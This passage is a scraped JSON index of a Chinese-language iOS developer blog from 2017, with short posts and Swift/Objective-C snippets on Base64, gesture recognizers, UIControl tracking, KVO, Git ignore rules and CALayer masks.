Assembling Link 作用 处理文字 变汇编 转换成机器码 变可执行程序 根据Wiki百科解释，编译是将人能读懂的Source Code变成机器能理解的汇编语言(寄存器指令)，然后通过汇编变成目标机器的(Machine Code/Object Code)，然后通过Link变为可执行程序的01010101…. Xcode头文件(预编译)对于计算机来讲，头文件是不需要的 对于Xcode来说仅仅在 预编译 和 编译 阶段需要头文件来进行静态检查是否存在有不知道的类或者方法 头文件的搜索目录可以通过配置Build Setting里的 Header Search Paths 来获取头文件，这个是磁盘目录，可以是电脑上的任意目录，无需添加任何文件进入Target Xcode Symbols(编译，汇编)把每一个文件中的可执行代码进行 编译和汇编 可以得到 同名的.o文件， 其后缀o就是指的 Object Code 之所以称为Object，是因为不同的硬件有不同的架构，如x86和arm64，例如iPhone模拟器是x86而iPhone真机大部分都是arm的，也就是说在此时Xcode已经完成了架构的处理 Xcode Link(链接)最终Xcode经过链接过程将.o文件组合起来，得到一个Mach-O文件(相当于一个压缩包) 并且生成 符号表 这个过程中存在两个常见的错误提示 Undefined symbols 和 Duplicated symbols 将在后续讲解 Mach-O文件是Macintosh系统中的一个文件类型，用来描述程序的运行和二进制代码之间的关系","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"String、Data、Base64的转换以及编码原理","date":"2017-05-23T15:00:00.000Z","path":"2017/05/24/StringDataBase64的转换以及编码原理/","text":"Base64和String之间的转换首先放上 String—&gt;Data—-&gt;Base64—-&gt;Data—-&gt;String 的转换过程 12345678910let plainStr: String &#x3D; &quot;String will be convert Data&quot; &#x2F;&#x2F;&quot;String will be convert Data&quot;let plainData: Data? &#x3D; plainStr.data(using: .utf8) &#x2F;&#x2F;27 byteslet base64Str: String &#x3D; plainData!.base64EncodedString() &#x2F;&#x2F;&quot;U3RyaW5nIHdpbGwgYmUgY29udmVydCBEYXRh&quot;let decodeData: Data? &#x3D; Data(base64Encoded: base64Str, options: .ignoreUnknownCharacters) &#x2F;&#x2F;27 byteslet decodeStr: String? &#x3D; String(data: decodeData!, encoding: .utf8) &#x2F;&#x2F;&quot;String will be convert Data&quot; 遇到的问题用 Base64编码的String—-&gt;Data 的时候，发现 NSData(base64Encoded:options:) 返回的是一个optional的值，原来还存在转换情况会返回nil， 以前OC的时候没注意到，Data成功的条件是 Base64字符串数据需要是4个字母的整数倍 比较好奇就查了一下 Base64的原理根据Wiki百科Base64是对二进制数据的一个处理，和String或者图片什么的具有可读性的数据没关系，也就是说二进制数据转换成A-z和0-9之类的可以被打印出来的字符串 10 1 0 0 1 1 0 1 0 1 1 0 0 0 0 1 0 1 1 0 1 1 1 0 -&gt;&gt;&gt;&gt;&gt;&gt;&gt;TWFu 原理是2的6次方是64，可以表达 【26个大写字母】+【26个小写字母】+【0-9】+【2个特殊字符】= 64个字符，也就是说可以用 这64个中的其中一个代表二进制的6bit 为什么要4字节呢因为Base64中任意一个符号代表的是6bit，而计算机最小储存单位是byte = 8bit，也就是说为了保证数据的正确性，要取6和8的最小公约数 14个Base64编码 &#x3D; 4 * 6bit &#x3D; 24bit &#x3D; 3 * 8bit &#x3D; 3byte的数据 所以说Base64编码的字符数一定是 4个字母 的整数位 发明这个的人是傻逼么？根据原理我们可以发现，Base64编码后数据量会变大，用4byte的字符表达了原来3byte的数据，而且没有任何保密性可言，为什么会存在这个东西呢 为了让电子邮件可以发图片最开始电子邮件设计的时候，是为了发文字而设计的，所以只可以发 ASCII 码， ASCII一共有128个 所以只需要 7bit 就可以表示完所有的字符 等到后来电子邮件系统升级的时候发现傻逼了，如果想发图片(代指大于7bit的数据，计算机每byte就是8bit)，就要把它变成能够通过电子邮件系统发送的东西，要能用字符串(即低于7bit)来表示 所以就发明了可以把 任意文件编码成字符串 的Base64编码(二进制—-&gt;ACSII码)，就可以用电子邮件来发送二进制了","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Base64","slug":"Base64","permalink":"http://yoursite.com/tags/Base64/"}]},{"title":"OC的init函数中self运行时指向问题","date":"2017-05-22T15:00:00.000Z","path":"2017/05/23/OC的init函数中self运行时指向问题/","text":"OC的运行时前几天写代码，踩了运行时的一个小坑，假设存在两个类 1234567891011121314151617181920212223242526272829@implementation SuperClass- (instancetype)init &#123; self &#x3D; [super init]; if (self) &#123; [self logClassName]; &#125; return self;&#125;- (void)logClassName &#123; NSLog(@&quot;Super&quot;) &#125;@end@implementation SubClass- (instancetype)init &#123; self &#x3D; [super init]; if (self) &#123; [self logClassName]; &#125; return self;&#125;- (void)logClassName &#123; NSLog(@&quot;Sub&quot;) &#125;@end 当我们对 SubClass 进行初始化的时候，发现运行完毕的输出为 122017-09-11 23:10:19.925 : Sub2017-09-11 23:10:19.925 : Sub 原因为什么会输出两个Sub而不是带有Super呢，是因为在运行时的时候 self总指向Instance本身 由于我们SubClass存在一个名为 logClassName 的函数 所以说在 SuperClass 执行时的所有函数调用会先对 SubClass 的 Instance 查询函数是否存在，在不存在的时候才会转发给Super，由于SubClass存在同名函数故被截断 也就是说在 SuperClass的Init方法中的 self仍指向的是SubClass","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Runtime","slug":"Runtime","permalink":"http://yoursite.com/tags/Runtime/"}]},{"title":"稳定高频函数调用的技巧","date":"2017-05-22T01:00:00.000Z","path":"2017/05/22/稳定高频函数调用的技巧/","text":"稳定高频函数调用有些时候会频繁调用一些函数，但是不想每次调用都让函数进行触发，比如 高频对一个View进行动画，但是仅仅想以最后一次的数据为准做动画 疯狂点击一个button，想控制其真正生效的次数 这里以第二个例子做一些稳定的模型 这些模型仅仅能对1秒这个量级进行控制，不能针对毫秒级的控制 123456789101112131415161718192021222324public class FrequencyButton: UIButton &#123; convenience public init(size: CGSize) &#123; self.init(frame: CGRect(origin: CGPoint.zero, size: size)) self.addTarget(self, action: #selector(touchUpInsideButton(button:)), for: .touchUpInside) &#125; @objc func touchUpInsideButton(button: UIButton) &#123; &#x2F;&#x2F;延迟模型 delayMethod(delay: 3) &#x2F;&#x2F;稳定模型 stableMethod() &#x2F;&#x2F;平滑模型 smoothMethod(invoke: 1.0) &#125; @objc func fireMethod() &#123; print(&quot;Method Fired At \\(Date().timeIntervalSince1970)&quot;) &#125; .........&#125; 延迟模型无论调用多少次，仅仅在 最后一次调用后延迟一个固定时间执行 12345678910111213141516171819&#x2F;&#x2F;-----------------------------------&#x2F;&#x2F; MARK: Delay Object&#x2F;&#x2F;-----------------------------------var fireInterval: TimeInterval &#x3D; 0.0func delayMethod(delay: TimeInterval) &#123; let delayInterval: TimeInterval &#x3D; CFAbsoluteTimeGetCurrent() + delay if delayInterval &gt; fireInterval &#123; fireInterval &#x3D; delayInterval self.perform(#selector(willFireMethodDelay), with: nil, afterDelay: fireInterval - CFAbsoluteTimeGetCurrent()) &#125;&#125;@objc func willFireMethodDelay() &#123; if CFAbsoluteTimeGetCurrent() &gt;&#x3D; fireInterval &#123; fireMethod() &#125;&#125; 稳定模型无论进行多少次调用，仅仅在 最后一次调用前的周期内以稳定的频率执行 1234567891011121314151617181920&#x2F;&#x2F;-----------------------------------&#x2F;&#x2F; MARK: Stable Object&#x2F;&#x2F;-----------------------------------var stableInterval: TimeInterval &#x3D; 1.0var fired: Bool &#x3D; truefunc stableMethod() &#123; if fired &#x3D;&#x3D; false &#123; return &#125; fired &#x3D; false self.perform(#selector(willFireMethodStable), with: nil, afterDelay: stableInterval)&#125;@objc func willFireMethodStable() &#123; fireMethod() fired &#x3D; true&#125; 平滑模型进行了 N次 调用，以稳定的时间周期，调用N次 12345678910111213141516171819202122232425262728&#x2F;&#x2F;-----------------------------------&#x2F;&#x2F; MARK: Smooth Object&#x2F;&#x2F;-----------------------------------var smoothIntervals: [TimeInterval] &#x3D; [TimeInterval]()var fired: Bool &#x3D; truefunc smoothMethod(invoke: TimeInterval?) &#123; if invoke !&#x3D; nil &#123; smoothIntervals.append(invoke!) &#125; if fired &#x3D;&#x3D; false &#123; return &#125; if smoothIntervals.count &gt; 0 &#123; fired &#x3D; false self.perform(#selector(willFireMethodSmooth), with: nil, afterDelay: smoothIntervals.first!) smoothIntervals.removeFirst() &#125;&#125;@objc func willFireMethodSmooth() &#123; fireMethod() fired &#x3D; true smoothMethod(invoke: nil)&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"局域网流量也需要获取数据访问权限","date":"2017-05-21T15:00:00.000Z","path":"2017/05/22/局域网流量也需要获取数据访问权限/","text":"局域网调试今天App有个功能用到了局域网数据传输的功能，发现一个现象 局域网内数据传输，模拟器正常使用，但是真机没有流量 经过多次折腾后发现，iOS10之后，工信部要求大陆版的iPhone的App的任何流量都需要获取到流量访问用户确认 App在安装到真机上因为没有请求过这个权限,所以即使是局域网的数据访问也不被允许 解决方案网上怨声载道一片，目前苹果也没有提供类似其它权限设置的Key值来进行开启，有个比较笨的解决方案就是 写一个不可见的WebView访问任意一个网页，让用户使用一下网络数据,但是使用完记得关掉，不然会一直占用CPU","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"模仿iPhone7Plus的相机变焦轮盘","date":"2017-05-20T15:00:00.000Z","path":"2017/05/21/模仿iPhone7Plus的相机变焦轮盘/","text":"一个转轮控件RouletteView产品突然给了一个需求，让做一个和iPhone7Plus一样用转轮变焦的控件 ！！！这些产品和交互。。。就知道对着苹果抄。。。！！ 研究了一下苹果的iPhone7Plus的变焦转轮，分析出以下需求 反馈区域 视图 反馈 标签 对变焦标签区域长按或左滑，弹出转轮 转轮(可见) 转轮存在时，整个转轮区域的滑动为变焦调节 转轮(不可见) 转轮不存在时，初标签外的区域滑动为调节亮度(其它反馈) 手势 手势 反馈 长按 弹出转轮 滑动(左) 弹出转轮 滑动(垂直) 调节变焦距离 控件实现思路转动效果的实现让设计给画一个圆形的图片，在转动时旋转这个图片的Transform 设定一个阈值Range来控制旋转的最大和最小角度 代码中实用的是 range: CGFloat = 200 反馈区域的处理因为要根据转轮图片是否出现调整反馈区域，所以 重写HitTest函数，在不同的情况下，调整反馈区域的大小来返回当前View 手势的处理 长按手势: 使用LongPressGestureRecoginze来接收长按手势让轮盘显示或者隐藏，根据文章Gesture和UITouch的互相作用注意设置 cancelsTouchesInView = false 左滑手势: 在 continueTracking 自己进行判断 上下滑动: 在 continueTracking 中进行运算从而旋转图片 代码展示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152public class RouletteView: UIControl &#123; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Property &#x2F;&#x2F;----------------------------------- public let roulette: UIImageView &#x3D; UIImageView(frame:CGRect.zero) public let icon: UILabel &#x3D; UILabel(frame:CGRect.zero) public var title: (_ angle: CGFloat) -&gt; String &#x3D; &#123; angle in return String(format: &quot;%.1f&quot;, angle) &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Private &#x2F;&#x2F;----------------------------------- private let range: CGFloat &#x3D; 200 private let pi_2: CGFloat &#x3D; CGFloat.pi&#x2F;2 &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: UI &#x2F;&#x2F;----------------------------------- override public init(frame: CGRect) &#123; super.init(frame: frame) addRoulette() constraintRoulette() patternRoulette() addRouletteActionGesture() &#125; required public init?(coder aDecoder: NSCoder) &#123; fatalError(&quot;init(coder:) has not been implemented&quot;) &#125; public override func layoutSubviews() &#123; if !icon.frame.equalTo(self.bounds) &#123; constraintRoulette() &#125; super.layoutSubviews() &#125; override public func hitTest(_ point: CGPoint, with event: UIEvent?) -&gt; UIView? &#123; if roulette.isHidden &#123; return super.hitTest(point, with: event) &#125; if roulette.frame.contains(point) &#123; return self; &#125; return super.hitTest(point, with: event) &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Setup UI &#x2F;&#x2F;----------------------------------- func addRoulette() &#123; self.addSubview(roulette) self.addSubview(icon) &#125; func constraintRoulette() &#123; icon.frame &#x3D; self.bounds let diameter: CGFloat &#x3D; min(UIScreen.main.bounds.width, UIScreen.main.bounds.height) roulette.bounds &#x3D; CGRect(x: 0, y: 0, width: diameter, height: diameter) roulette.center &#x3D; CGPoint(x: icon.center.x+diameter&#x2F;7, y: icon.center.y) icon.layer.cornerRadius &#x3D; icon.bounds.width&#x2F;2 &#125; func patternRoulette() &#123; icon.layer.borderWidth &#x3D; 1 icon.font &#x3D; UIFont.systemFont(ofSize: 8) icon.layer.borderColor &#x3D; UIColor.white.cgColor icon.textAlignment &#x3D; NSTextAlignment.center icon.textColor &#x3D; UIColor.white icon.text &#x3D; &quot;N&#x2F;A&quot; roulette.image &#x3D; UIImage(framework: &quot;uisit_roulette_circle&quot;) roulette.isHidden &#x3D; true &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Action &#x2F;&#x2F;----------------------------------- func addRouletteActionGesture() &#123; let longPress: UILongPressGestureRecognizer &#x3D; UILongPressGestureRecognizer(target: self, action: #selector(gestureLongPress(recognizer:))) longPress.cancelsTouchesInView &#x3D; false self.addGestureRecognizer(longPress) &#125; @objc func gestureLongPress(recognizer: UILongPressGestureRecognizer) &#123; if recognizer.state &#x3D;&#x3D; UIGestureRecognizerState.began &#123; roulette.isHidden &#x3D; false &#125; &#125; @objc func leftPanShowRoulette(_ touch: UITouch) &#123; if touch.previousLocation(in: self).x - touch.location(in: self).x &gt; 5 &#123; roulette.isHidden &#x3D; false &#125; &#125; @objc func hideRoulette() &#123; roulette.isHidden &#x3D; true &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Rotate Roulette &#x2F;&#x2F;----------------------------------- private func rotatedAngle(_ touch: UITouch) -&gt; CGFloat &#123; let cY:CGFloat &#x3D; touch.location(in: self).y let pY:CGFloat &#x3D; touch.previousLocation(in: self).y var angle: CGFloat &#x3D; currentAngle() - ((cY - pY)&#x2F;range)*CGFloat.pi angle &#x3D; angle &gt; pi_2 ? pi_2 : (angle &lt; -pi_2 ? -pi_2: angle) return angle &#125; private func currentAngle() -&gt; CGFloat &#123; return atan2(roulette.transform.b,roulette.transform.a) &#125; private func rotateRoulette(_ touch: UITouch) &#123; let angle: CGFloat &#x3D; rotatedAngle(touch) roulette.transform &#x3D; CGAffineTransform(rotationAngle: angle) icon.text &#x3D; title(angle) &#125; &#x2F;&#x2F;----------------------------------- &#x2F;&#x2F; MARK: Touch Track &#x2F;&#x2F;----------------------------------- override public func continueTracking(_ touch: UITouch, with event: UIEvent?) -&gt; Bool &#123; if !roulette.isHidden &#123; rotateRoulette(touch) &#125;else &#123; leftPanShowRoulette(touch) &#125; return super.continueTracking(touch, with: event) &#125; override public func endTracking(_ touch: UITouch?, with event: UIEvent?) &#123; hideRoulette() super.endTracking(touch, with: event) &#125; override public func cancelTracking(with event: UIEvent?) &#123; hideRoulette() super.cancelTracking(with: event) &#125;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UITouch","slug":"UITouch","permalink":"http://yoursite.com/tags/UITouch/"},{"name":"Gesture","slug":"Gesture","permalink":"http://yoursite.com/tags/Gesture/"}]},{"title":"Gesture和UIControl触发顺序","date":"2017-05-20T11:00:00.000Z","path":"2017/05/20/Gesture和UIControl触发顺序/","text":"UIControl的事件不触发今天发现一个自定义的UIControl控件的事件无法触发，查了以下发现原因是 UIControl被置于一个有TapGestureRecognizer的SuperView上 根据搜索这个问题2010年时在UIButton上也存在写了一段Demo测试了一下 UIButton被Apple处理过了经过Demo测试发现，在一个存在TapGesture的View上，UIButton的TouchUpInside可以正确被触发，但是自定义的UIControl不行 具体原因猜测是因为GestureRecognizer会取消掉Touch的生命周期，看来在苹果的底层传递机制上，是先进行Gesture的遍历，才会去对Touch做处理 在SuperView识别到了Gesture后，UITouch的传递就会被取消掉，导致子View无法触发Tracking事件 Demo123456789101112131415161718192021222324252627282930313233343536public class GestureSuperView: UIView &#123; let control: UIControl &#x3D; UIControl() let button: UIButton &#x3D; UIButton() convenience public init(size: CGSize) &#123; self.init(frame: CGRect(origin: CGPoint.zero, size: size)) self.backgroundColor &#x3D; UIColor.red self.addSubview(control) self.addSubview(button) let tap: UITapGestureRecognizer &#x3D; UITapGestureRecognizer(target: self, action: #selector(tapGestureProcess(tap:))) &#x2F;&#x2F;-----------------------------------&#x2F;&#x2F; tap.cancelsTouchesInView &#x3D; false &#x2F;&#x2F;----------------------------------- self.addGestureRecognizer(tap) control.frame &#x3D; CGRect(x: 0, y: 0, width: self.bounds.width&#x2F;2, height: self.bounds.height) control.addTarget(self, action: #selector(touchUpInside(control:)), for: .touchUpInside) control.backgroundColor &#x3D; UIColor.blue button.frame &#x3D; CGRect(x: self.bounds.width&#x2F;2, y: 0, width: self.bounds.width&#x2F;2, height: self.bounds.height) button.addTarget(self, action: #selector(touchUpInside(control:)), for: .touchUpInside) button.backgroundColor &#x3D; UIColor.yellow &#125; @objc func tapGestureProcess(tap: UITapGestureRecognizer) &#123; print(&quot;Invoke Tap Gesture...&quot;) &#125; @objc func touchUpInside(control: UIControl) &#123; print(&quot;Invoke Touch Up Inside...&quot;) &#125;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Gesture","slug":"Gesture","permalink":"http://yoursite.com/tags/Gesture/"},{"name":"UIControl","slug":"UIControl","permalink":"http://yoursite.com/tags/UIControl/"}]},{"title":"GestureRecognizer会取消掉Touch的生命周期","date":"2017-05-20T01:00:00.000Z","path":"2017/05/20/GestureRecognizer会取消掉Touch的生命周期/","text":"Gesture和Touch的互相影响在beginTracking和touchesBegan中我们讨论了，UIControl和UIView对于Touch的不同追踪阶段 当UIView存在GestrueRecognize时，GesuteRecoginzer的 cancelsTouchesInView属性会在手势被正确识别后中断追踪 123456789101112131415161718192021222324252627282930313233343536373839404142public class TouchControl: UIControl &#123; convenience public init(size: CGSize) &#123; self.init(frame: CGRect(origin: CGPoint.zero, size: size)) self.backgroundColor &#x3D; UIColor.red let pan: UIPanGestureRecognizer &#x3D; UIPanGestureRecognizer(target: self, action: #selector(panGestureProcess(touch:))) &#x2F;&#x2F;------------------------------------ pan.cancelsTouchesInView &#x3D; false &#x2F;&#x2F;------------------------------------ self.addGestureRecognizer(pan) &#125; @objc func panGestureProcess(touch: UIPanGestureRecognizer) &#123; if touch.state &#x3D;&#x3D; .began &#123; print(&quot;Pan Gesture Process ...........&quot;) &#125; &#125; public override func touchesBegan(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; print(&quot;UIView Touches Began ...........&quot;) super.touchesBegan(touches, with: event) &#125; public override func touchesMoved(_ touches: Set&lt;UITouch&gt;, with event: UIEvent?) &#123; print(&quot;UIView Touches Moved ...........&quot;) super.touchesMoved(touches, with: event) &#125; public override func beginTracking(_ touch: UITouch, with event: UIEvent?) -&gt; Bool &#123; print(&quot;UIControl Began Tracking ...........&quot;) return super.beginTracking(touch, with: event) &#125; public override func continueTracking(_ touch: UITouch, with event: UIEvent?) -&gt; Bool &#123; print(&quot;UIControl Continue Tracking ...........&quot;) return super.continueTracking(touch, with: event) &#125;&#125; cancelsTouchesInView默认 打印日志12345UIView Touches Began ...........UIControl Began Tracking ..................Pan Gesture Process ........... &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;识别后不会触发Move和Continue cancelsTouchesInView = false 打印日志123456789101112131415161718UIView Touches Began ...........UIControl Began Tracking ....................Pan Gesture Process ........... &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;识别后还会继续触发Move和ContinueUIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........UIControl Continue Tracking ...........UIView Touches Moved ...........","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UITouch","slug":"UITouch","permalink":"http://yoursite.com/tags/UITouch/"},{"name":"Gesture","slug":"Gesture","permalink":"http://yoursite.com/tags/Gesture/"}]},{"title":"beginTracking与touchesBegan的异同","date":"2017-05-19T20:00:00.000Z","path":"2017/05/20/beginTracking与touchesBegan的异同/","text":"beginTracking 继承于 UIControl UITouch进入了 UIControl 的bounds内，对该Touch进行处理 定义一些追踪事件 touchesBegan 继承于 UIView 用于处理所有和当前UIView相关的 UITouch事件 更着重于定义一些触摸事件，而不是触摸的运动逻辑，比如多点触摸还是单点触摸 异同以上是根据StackOverflow上的一个总结，感觉 beginTracking着重于对于单个UITouch的追踪，而touchesBegan则着重于处理当前屏幕上的所有UITouch beginTracking更看中当前UIControl的bounds内的手势处理，而 touchesBegan 关注的是整个screen和当前UIView的手势操作关系 beginTracking更看中手势操作的逻辑，和touchesBegan更看中是否产生了触摸手势 也就是说 touchesBegan 比 beginTracking 考虑的更为底层","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UITouch","slug":"UITouch","permalink":"http://yoursite.com/tags/UITouch/"}]},{"title":"自定义UI如何被XCTestUI测试识别","date":"2017-05-07T15:00:00.000Z","path":"2017/05/08/自定义UI如何被CXTestUI测试识别/","text":"XCTest识别问题今天和测试对接的过程中，有一个自定的Button因为直接继承于UIControl，无法被XCTest测试框架识别成Button，查了一下，需要手动设置 12switchBtn.accessibilityTraits &#x3D; UIAccessibilityTraitButton;switchBtn.isAccessibilityElement &#x3D; YES; 让其可以被识别成 UIAccessibilityTraitButton 不然默认的是 UIAccessibilityTraitOther","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"XCTest","slug":"XCTest","permalink":"http://yoursite.com/tags/XCTest/"}]},{"title":"StackView改背景色","date":"2017-05-06T15:00:00.000Z","path":"2017/05/07/StackView改背景色/","text":"仅有CALayer层的View有些View虽然是UIView，但是仅有CALayer层，所以不能通过调用 .layer 来改变一些layer层的属性，如StackView，报错如下 12......&lt;CATransformLayer: 0x60800023f120&gt; - changing property backgroundColor in transform-only layer, will have no effect...... &lt;CATransformLayer: 0x60800023f120&gt; - changing property cornerRadius in transform-only layer, will have no effect 解决方法是，自己新建一个Layer当作Background 123CALayer *background &#x3D; [CALayer layer];[background setBackGroundColor:[UIColor blackColor].CGColor];[StackView addSubLayer:background];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"StackView","slug":"StackView","permalink":"http://yoursite.com/tags/StackView/"}]},{"title":"如何打印RetainCount","date":"2017-05-05T01:00:00.000Z","path":"2017/05/05/如何打印RetainCount/","text":"打印RetainCount注意需要该函数为一个C Function，需要转化成CFTypeRef 12NSLog(@&quot;Class A Retain : %ld&quot;, CFGetRetainCount((__bridge CFTypeRef)(_classA)));","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"RetainCount","slug":"RetainCount","permalink":"http://yoursite.com/tags/RetainCount/"}]},{"title":"NSArray的setValueforKey","date":"2017-05-04T15:00:00.000Z","path":"2017/05/05/NSArray的setValueforKey/","text":"NSArray的 KeyValueCoding Category今天在写代码的时候手抖，对某一个 NSArray对象使用了 setValue:forKey: 方法，点进去发现还真有这个方法，可以对Array里的每一个对象发送这两个消息方法，例如 Array中存储的是Dictionary的时候，可以使用这两个方法一次性 对所有Element操作并且把结果作为Array 获取出来，算是个语法糖吧 123456789101112@interface NSArray&lt;ObjectType&gt;(NSKeyValueCoding)&#x2F;* Return an array containing the results of invoking -valueForKey: on each of the receiver&#39;s elements. The returned array will contain NSNull elements for each instance of -valueForKey: returning nil.*&#x2F;- (id)valueForKey:(NSString *)key;&#x2F;* Invoke -setValue:forKey: on each of the receiver&#39;s elements.*&#x2F;- (void)setValue:(nullable id)value forKey:(NSString *)key;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"UIViewController无法响应Gesture","date":"2017-05-01T15:00:00.000Z","path":"2017/05/02/UIViewController无法响应Gesture/","text":"无法响应Gesture手势今天在做一个测试代码时，在一个新工程中删除掉 Main.storyboard ,然后在 AppDelegate中使用默认的ViewController启动，并且执行以下代码 123456789- (void)viewDidLoad &#123; [super viewDidLoad]; &#x2F;&#x2F; Do any additional setup after loading the view, typically from a nib. UIView *view &#x3D; [[UIView alloc] initWithFrame:[UIScreen mainScreen].bounds]; [self.view addSubView:view]; [view addGestureRecognizer:[[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(some)];&#125; 发现函数 some 不会被触发，因为Gesture没有生效。。。。后来加了这么一句好了，不知道为什么 没有背景色Gesture不会生效 1[self.view setBackgroundColor:[UIColor whiteColor]];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Gesture","slug":"Gesture","permalink":"http://yoursite.com/tags/Gesture/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"}]},{"title":"Git目录重复导致ignore不掉","date":"2017-04-30T15:00:00.000Z","path":"2017/05/01/Git目录重复导致ignore不掉/","text":"Git目录重复导致ignore不掉今天在做一些静态库资源打包的时候，使用Bundle加入到App.xcodeproj中，因为Bundle每次编译都会生成一份新的，所以想用gitignore把它忽略掉,其目录为下 1234567App&#x2F;App.xcodeproj --App --Resources --Custom.bundle --Support Files 使用了如下的gitignore文件 12*&#x2F;Resources&#x2F;Custom.bundle 结果总是ignore失败，最后改为 1*&#x2F;App&#x2F;Resources&#x2F;Custom.bundle 才成功，是因为Git目录下存在多个叫 Resources的目录，ignore文件无法定位具体从哪个开始，况且Bundle自身也存在一个叫 Resources 的文件夹","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"}]},{"title":"KVO对象的正确移除","date":"2017-04-30T15:00:00.000Z","path":"2017/05/01/KVO对象的正确移除/","text":"KVO的两个对象都必须移除今天在使用KVO的时候，希望做到一个View监听superView是否产生变化，然后触发函数，使用以下KVO 123456789- (void)dealloc &#123; [self.view removeObserver:self forKeyPath:&quot;center&quot;]&#125;.... &#123; [self.view addObserver:self forKeyPath:&quot;center&quot; options:NSKeyValueObservingOptionNew context:nil]&#125; 发现会报错KVO错误的释放，原因是因为 self.superView 的 dealloc 产生在self的dealloc之前，也就是当调用dealloc函数时，self.superView 已经不存在了 所以会产生KVO释放的错误，如果在 [self.superView dealloc] 里进行remove则不会报错，所以说KVO对象移除时，一定要保证 Observer 在其监听的对象释放之前被移除","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"KVO","slug":"KVO","permalink":"http://yoursite.com/tags/KVO/"}]},{"title":"UIImage如何转换成CALayer","date":"2017-04-09T15:00:00.000Z","path":"2017/04/10/UIImage如何转换成CALayer/","text":"为何要UIImage转化成CALayer比如在文章隐式动画模仿苹果原生UISwitch我们可以通过一个扩展方法，让本来只有纯色的Switch使用图片而不修改动画效果 123456789101112131415extension SwithButton &#123; func setOffLayer(_ image:UIImage) &#123; offLayer.contents &#x3D; image.cgImage &#125; func setOnLayer(_ image:UIImage) &#123; onLayer.contents &#x3D; image.cgImage &#125; func setThumbLayer(_ image:UIImage) &#123; thumbLayer.contents &#x3D; image.cgImage &#125;&#125; 如果使用OC的话可能需要一个强制转换 12CALayer *layer &#x3D; [CALayer layer];[layer setContents:(id)image.CGImage];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CALayer","slug":"CALayer","permalink":"http://yoursite.com/tags/CALayer/"}]},{"title":"CAAnimation(八) MaskView和SubLayer组合动画","date":"2017-04-07T15:00:00.000Z","path":"2017/04/08/CAAnimation八MaskView和SubLayer组合动画/","text":"MaskView的原理在UIView中有一个属性叫Mask 1open var mask: UIView? 可以通过另外一个UIView的Alpha通道和当前的UIView进行与运算，对当前的UIView进行显示，例如 12345let view: UIView &#x3D; UIView(frame: CGRect(x: 0, y: 0, width: 300, height: 100))let mask: UIView &#x3D; UIView(frame: CGRect(x: 50, y: 0, width: 100, height: 100))view.backgroundColor &#x3D; UIColor.red &#x2F;&#x2F; 背景色为300*100的红色mask.backgroundColor &#x3D; UIColor.blue &#x2F;&#x2F; 仅仅是为mask提供了Alpha通道，所以设置成任何颜色都可以view.mask &#x3D; mask &#x2F;&#x2F; 得到一个 100*100 的红色 得到结果 可以看到我们把 view设置成了红色，但是只显示了50px之后maskView的部分 ， 是因为除了maskView之外的像素点，在MaskView的图层Alpha通道都为0 组合SubLayer如果我们直接更改MaskView的Frame的话，感觉View的可见尺寸 （红色部分） 变化会比较突然，没有任何平滑效果，根据Mask的原理 可以用SubLayer控制Alpha通道从而得到隐式动画效果 123456789101112let view: UIView &#x3D; UIView(frame: CGRect(x: 0, y: 0, width: 300, height: 100))view.backgroundColor &#x3D; UIColor.red&#x2F;&#x2F;Sublayer Refractlet maskLayer:CALayer &#x3D; CALayer()maskLayer.backgroundColor &#x3D; UIColor.blue.cgColormaskLayer.frame &#x3D; 